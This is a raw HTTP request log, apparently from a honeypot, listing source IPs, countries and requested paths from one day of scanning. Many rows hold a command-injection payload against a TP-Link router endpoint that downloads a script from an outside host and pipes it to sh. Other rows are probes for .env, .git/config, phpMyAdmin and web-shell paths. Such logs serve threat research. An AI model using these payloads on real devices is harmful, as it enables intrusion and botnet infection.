"2025-07-07","64.227.183.45","India","HTTP","/get.php"
"2025-07-07","209.38.37.157","The Netherlands","HTTP","/get.php"
"2025-07-07","95.214.53.84","Poland","HTTP","/cgi-bin/index.html"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","89.42.231.140","The Netherlands","HTTP","/goform/formJsonAjaxReq"
"2025-07-07","154.126.201.150","South Africa","HTTP","/admin/config.php"
"2025-07-07","167.94.145.96","United States","HTTP","/favicon.ico"
"2025-07-07","167.94.145.96","United States","HTTP","/favicon.ico"
"2025-07-07","167.94.145.96","United States","HTTP","/.well-known/security.txt"
"2025-07-07","20.14.73.63","United States","HTTP","/druid/index.html"
"2025-07-07","87.255.194.135","Kazakhstan","HTTP","/admin/assets/js/views/login.js"
"2025-07-07","207.167.67.206","United States","HTTP","http://example.com/"
"2025-07-07","207.167.67.206","United States","HTTP","http://example.com/"
"2025-07-07","162.142.125.192","United States","HTTP","/favicon.ico"
"2025-07-07","162.142.125.192","United States","HTTP","/.well-known/security.txt"
"2025-07-07","45.82.78.254","Germany","HTTP","/favicon.ico"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","206.168.34.121","United States","HTTP","/favicon.ico"
"2025-07-07","206.168.34.121","United States","HTTP","/favicon.ico"
"2025-07-07","206.168.34.121","United States","HTTP","/robots.txt"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","87.121.84.34","The Netherlands","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","87.121.84.34","The Netherlands","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","207.167.67.206","United States","HTTP","http://example.com/"
"2025-07-07","207.167.67.206","United States","HTTP","http://example.com/"
"2025-07-07","157.230.7.66","United States","HTTP","/wsman"
"2025-07-07","97.107.131.239","United States","HTTP","/favicon.ico"
"2025-07-07","165.227.17.81","United States","HTTP","/auth.html"
"2025-07-07","165.227.17.81","United States","HTTP","/auth1.html"
"2025-07-07","165.227.17.81","United States","HTTP","/sslvpnLogin.html"
"2025-07-07","165.227.17.81","United States","HTTP","/api/sonicos/auth"
"2025-07-07","165.227.17.81","United States","HTTP","/api/sonicos/tfa"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","118.193.33.130","Hong Kong","HTTP","/favicon.ico"
"2025-07-07","118.193.33.130","Hong Kong","HTTP","/sitemap.xml"
"2025-07-07","118.193.33.130","Hong Kong","HTTP","/robots.txt"
"2025-07-07","104.234.115.90","Canada","HTTP","/favicon.ico"
"2025-07-07","201.7.170.246","Brazil","HTTP","/admin/config.php"
"2025-07-07","112.27.123.217","China","HTTP","http://108.174.54.75:80/phpMyAdmin-2.10.3/scripts/setup.php"
"2025-07-07","112.27.123.217","China","HTTP","http://108.174.54.75:80/phpMyAdmin-2.11.1.2/scripts/setup.php"
"2025-07-07","112.27.123.217","China","HTTP","http://108.174.54.75:80/phpMyAdmin-2.10.0.2/scripts/setup.php"
"2025-07-07","112.27.123.217","China","HTTP","http://108.174.54.75:80/PHPMYADMIN/scripts/setup.php"
"2025-07-07","112.27.123.217","China","HTTP","http://108.174.54.75:80/phpma/scripts/setup.php"
"2025-07-07","112.27.123.217","China","HTTP","http://108.174.54.75:80/mysql-admin/scripts/setup.php"
"2025-07-07","112.27.123.217","China","HTTP","http://108.174.54.75:80/SQL/scripts/setup.php"
"2025-07-07","112.27.123.217","China","HTTP","http://108.174.54.75:80/web/phpMyAdmin/scripts/setup.php"
"2025-07-07","112.27.123.217","China","HTTP","http://108.174.54.75:80/webadmin/scripts/setup.php"
"2025-07-07","112.27.123.217","China","HTTP","http://108.174.54.75:80/sqlmanager/scripts/setup.php"
"2025-07-07","112.27.123.217","China","HTTP","http://108.174.54.75:80/phpMyAdmin-2.11.9.2/scripts/setup.php"
"2025-07-07","112.27.123.217","China","HTTP","http://108.174.54.75:80/phpMyAdmin2/scripts/setup.php"
"2025-07-07","112.27.123.217","China","HTTP","http://108.174.54.75:80/_phpMyAdmin/scripts/setup.php"
"2025-07-07","112.27.123.217","China","HTTP","http://108.174.54.75:80/myadmin/scripts/setup.php"
"2025-07-07","112.27.123.217","China","HTTP","http://108.174.54.75:80/php/scripts/setup.php"
"2025-07-07","112.27.123.217","China","HTTP","http://108.174.54.75:80/admin/scripts/setup.php"
"2025-07-07","112.27.123.217","China","HTTP","http://108.174.54.75:80/phpmyadmin/scripts/setup.php"
"2025-07-07","112.27.123.217","China","HTTP","http://108.174.54.75:80/dbadmin/scripts/setup.php"
"2025-07-07","112.27.123.217","China","HTTP","http://108.174.54.75:80/pma/scripts/setup.php"
"2025-07-07","112.27.123.217","China","HTTP","http://108.174.54.75:80/phpMyAdmin/scripts/setup.php"
"2025-07-07","112.27.123.217","China","HTTP","http://108.174.54.75:80/sql/scripts/setup.php"
"2025-07-07","112.27.123.217","China","HTTP","http://108.174.54.75:80/sqlweb/scripts/setup.php"
"2025-07-07","112.27.123.217","China","HTTP","http://108.174.54.75:80/phpMyAdmin-2.10.2/scripts/setup.php"
"2025-07-07","112.27.123.217","China","HTTP","http://108.174.54.75:80/MyAdmin/scripts/setup.php"
"2025-07-07","112.27.123.217","China","HTTP","http://108.174.54.75:80/db/scripts/setup.php"
"2025-07-07","112.27.123.217","China","HTTP","http://108.174.54.75:80/mysql/scripts/setup.php"
"2025-07-07","20.55.4.75","United States","HTTP","/manager/text/list"
"2025-07-07","207.167.67.206","United States","HTTP","http://example.com/"
"2025-07-07","207.167.67.206","United States","HTTP","http://example.com/"
"2025-07-07","159.89.88.69","United States","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","144.172.97.96","United States","HTTP","/boaform/admin/formLogin"
"2025-07-07","95.214.53.84","Poland","HTTP","/cgi-bin/index.html"
"2025-07-07","45.194.66.8","United States","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-07-07","45.194.66.8","United States","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-07-07","87.255.194.135","Kazakhstan","HTTP","/admin/assets/js/pbxlib.js"
"2025-07-07","45.194.66.8","United States","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","64.62.156.96","United States","HTTP","/favicon.ico"
"2025-07-07","64.62.156.94","United States","HTTP","/geoserver/web/"
"2025-07-07","167.71.191.116","United States","HTTP","/.env"
"2025-07-07","167.71.191.116","United States","HTTP","/.git/config"
"2025-07-07","207.167.67.206","United States","HTTP","http://example.com/"
"2025-07-07","207.167.67.206","United States","HTTP","http://example.com/"
"2025-07-07","20.163.61.136","United States","HTTP","/hudson"
"2025-07-07","144.172.97.96","United States","HTTP","/boaform/admin/formLogin"
"2025-07-07","154.126.201.150","South Africa","HTTP","/admin/assets/css/jquery-ui.css"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","20.65.194.111","United States","HTTP","/hudson"
"2025-07-07","79.124.58.198","Bulgaria","HTTP","/?XDEBUG_SESSION_START=phpstorm"
"2025-07-07","193.174.89.19","Germany","HTTP","/connector.sds"
"2025-07-07","207.167.67.206","United States","HTTP","http://example.com/"
"2025-07-07","207.167.67.206","United States","HTTP","http://example.com/"
"2025-07-07","185.148.1.243","Finland","HTTP","/.svn/wc.db"
"2025-07-07","95.214.53.84","Poland","HTTP","/login.asp"
"2025-07-07","79.124.58.198","Bulgaria","HTTP","/actuator/gateway/routes"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.53.84","Poland","HTTP","/userRpmNatDebugRpm26525557/start_art.html"
"2025-07-07","80.82.77.139","The Netherlands","HTTP","/favicon.ico"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","207.167.67.206","United States","HTTP","http://example.com/"
"2025-07-07","207.167.67.206","United States","HTTP","http://example.com/"
"2025-07-07","198.235.24.173","United States","HTTP","/shell.php"
"2025-07-07","201.7.170.246","Brazil","HTTP","/admin/assets/css/jquery-ui.css"
"2025-07-07","95.214.53.84","Poland","HTTP","/userRpmNatDebugRpm26525557/start_art.html"
"2025-07-07","205.210.31.207","United States","HTTP","/webshell.php"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","207.167.67.206","United States","HTTP","http://example.com/"
"2025-07-07","207.167.67.206","United States","HTTP","http://example.com/"
"2025-07-07","87.121.84.34","The Netherlands","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","87.121.84.34","The Netherlands","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","87.255.194.135","Kazakhstan","HTTP","/admin/configs.php"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","20.65.195.47","United States","HTTP","/developmentserver/metadatauploader"
"2025-07-07","207.167.67.206","United States","HTTP","http://example.com/"
"2025-07-07","207.167.67.206","United States","HTTP","http://example.com/"
"2025-07-07","79.124.58.198","Bulgaria","HTTP","/?XDEBUG_SESSION_START=phpstorm"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","165.232.95.101","The Netherlands","HTTP","/.env"
"2025-07-07","165.232.95.101","The Netherlands","HTTP","/.git/config"
"2025-07-07","68.183.15.232","The Netherlands","HTTP","/download/powershell/"
"2025-07-07","68.183.15.232","The Netherlands","HTTP","/get.php"
"2025-07-07","20.150.194.114","United States","HTTP","/manager/html"
"2025-07-07","95.214.53.84","Poland","HTTP","/SDK/webLanguage"
"2025-07-07","79.124.58.198","Bulgaria","HTTP","/actuator/gateway/routes"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
"2025-07-07","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget+http://220.158.234.135/x/tplink+-O-|sh)"
